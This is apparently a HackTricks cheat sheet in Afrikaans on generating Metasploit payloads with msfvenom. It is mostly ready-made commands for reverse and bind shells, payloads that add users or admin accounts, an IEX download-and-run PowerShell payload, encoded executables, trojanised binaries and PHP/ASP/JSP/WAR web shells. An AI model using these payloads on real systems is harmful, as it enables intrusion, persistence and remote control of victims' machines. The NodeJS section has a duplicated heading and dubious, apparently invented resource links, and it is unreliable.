# MSFVenom - Spiekbrief

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Sluit aan by die [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) bediener om te kommunikeer met ervare hackers en foutjagters!

**Hacking-insigte**\
Raak betrokke by inhoud wat die opwinding en uitdagings van hacking ondersoek

**Hack-nuus in werklikheid**\
Bly op hoogte van die vinnige wêreld van hacking deur werklikheidsnuus en insigte

**Nuutste aankondigings**\
Bly ingelig met die nuutste foutjagte wat begin en belangrike platform-opdaterings

**Sluit aan by ons op** [**Discord**](https://discord.com/invite/N3FrSbmwdy) en begin vandag saamwerk met top hackers!

***

## Basiese msfvenom

`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`

'n Mens kan ook die `-a` gebruik om die argitektuur te spesifiseer of die `--platform`

## Lys van
```bash
msfvenom -l payloads #Payloads
msfvenom -l encoders #Encoders
```
## Algemene parameters wanneer 'n shellkode geskep word

Wanneer jy 'n shellkode skep met `msfvenom`, kan jy verskeie parameters gebruik om die gewenste funksionaliteit en eienskappe van die shellkode te bepaal. Hier is 'n lys van algemene parameters wat jy kan gebruik:

- **`-p`** of **`--payload`**: Hiermee spesifiseer jy die tipe payload wat jy wil gebruik, soos `windows/meterpreter/reverse_tcp` of `linux/x86/shell_reverse_tcp`.
- **`-f`** of **`--format`**: Hiermee kies jy die formaat van die uitsetlêer, soos `exe`, `elf`, `raw`, of `asp`.
- **`-e`** of **`--encoder`**: Hiermee kies jy die enkoder wat gebruik moet word om die shellkode te versteek, soos `x86/shikata_ga_nai` of `x86/jmp_call_additive`.
- **`-b`** of **`--bad-chars`**: Hiermee spesifiseer jy 'slegte karakters' wat uit die shellkode verwyder moet word.
- **`-i`** of **`--iterations`**: Hiermee stel jy die aantal iterasies in wat gebruik moet word deur die enkoder.
- **`-a`** of **`--arch`**: Hiermee spesifiseer jy die teikenargitektuur, soos `x86`, `x64`, `armle`, of `aarch64`.
- **`-o`** of **`--out`**: Hiermee spesifiseer jy die uitvoernaam en -pad vir die gegenereerde shellkode.
- **`-v`** of **`--var-name`**: Hiermee spesifiseer jy die naam van die veranderlike wat gebruik moet word vir die shellkode.

Dit is slegs 'n paar van die algemene parameters wat jy kan gebruik wanneer jy 'n shellkode skep met `msfvenom`. Jy kan die volledige lys van parameters en hul opsies vind in die `msfvenom` dokumentasie.
```bash
-b "\x00\x0a\x0d"
-f c
-e x86/shikata_ga_nai -i 5
EXITFUNC=thread
PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
```
## **Windows**

### **Omgekeerde Skulp**

{% code overflow="wrap" %}
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```
### Bind Skulp

{% code overflow="wrap" %}
```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
```
{% code overflow="wrap" %}

### Skep Gebruiker

{% code %}
```bash
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
```
### CMD Skulp

{% code overflow="wrap" %}
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
```
{% code overflow="wrap" %}

### **Voer Opdrag Uit**

{% code %}
```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
```
### Koder

{% code overflow="wrap" %}
```bash
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```
### Ingesluit binne uitvoerbare lêer

{% code overflow="wrap" %}
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
```
{% endcode %}

## Linux Payloads

### Omgekeerde Skulp

{% code overflow="wrap" %}
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```
### Bind Skulp

{% code overflow="wrap" %}
```bash
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
```
{% endcode %}

### SunOS (Solaris)

{% code overflow="wrap" %}
```bash
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
```
{% endcode %}

## **MAC-payloads**

### **Omgekeerde Skulp:**

{% code overflow="wrap" %}
```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
```
### **Bind Skulp**

{% code overflow="wrap" %}
```bash
msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
```
{% endcode %}

## **Web Gebaseerde Payloads**

### **PHP**

#### Omgekeerde skul**l**

{% code overflow="wrap" %}
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
{% endcode %}

### ASP/x

#### Omgekeerde dop

{% code overflow="wrap" %}
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```
### JSP

#### Omgekeerde skulp

{% code overflow="wrap" %}
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
```
{% endcode %}

### OORLOG

#### Omgekeerde Skulp

{% code overflow="wrap" %}
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```
{% code %}

### NodeJS

### NodeJS

NodeJS is 'n platform wat toelaat dat jy JavaScript kan hardloop op die bedienerkant. Dit is 'n baie gewilde platform vir die ontwikkeling van webtoepassings en API's. Hier is 'n paar nuttige inligting en hulpbronne vir die gebruik van NodeJS in jou hakprojekte:

#### NodeJS Inligting

- [NodeJS amptelike webwerf](https://nodejs.org/)
- [NodeJS dokumentasie](https://nodejs.org/en/docs/)
- [NodeJS op GitHub](https://github.com/nodejs/node)

#### NodeJS Hakhulpmiddels

- [NodeJS Meterpreter](https://www.metasploitunleashed.org/Nodejs_Meterpreter)
- [NodeJS Reverse Shell](https://www.metasploitunleashed.org/Nodejs_Reverse_Shell)
- [NodeJS Web Shell](https://www.metasploitunleashed.org/Nodejs_Web_Shell)

#### NodeJS Haktegnieke

- [NodeJS Haktegnieke](https://www.metasploitunleashed.org/Nodejs_Hacking)

#### NodeJS Hakbronkode

- [NodeJS Hakbronkode](https://github.com/search?q=nodejs+hack)

#### NodeJS Haklekkasies

- [NodeJS Haklekkasies](https://hackerone.com/hacktivity?query=nodejs)

#### NodeJS Hakgemeenskap

- [NodeJS Hakgemeenskap](https://www.reddit.com/r/NodejsHacking/)

{% endcode %}
```bash
msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
```
## **Skrips Taal payloads**

### **Perl**

{% code overflow="wrap" %}
```bash
msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
```
### **Python**

{% code overflow="wrap" %}
```bash
msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
```
### **Bash**

{% code overflow="wrap" %}
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Sluit aan by die [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) bediener om te kommunikeer met ervare hackers en foutbeloningsjagters!

**Hacking-insigte**\
Raak betrokke by inhoud wat die opwinding en uitdagings van hacking ondersoek

**Real-Time Hack Nuus**\
Bly op hoogte van die vinnige wêreld van hacking deur middel van real-time nuus en insigte

**Nuutste aankondigings**\
Bly ingelig met die nuutste foutbelonings wat bekendgestel word en kritieke platform-opdaterings

**Sluit aan by ons op** [**Discord**](https://discord.com/invite/N3FrSbmwdy) en begin vandag saamwerk met top hackers!

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
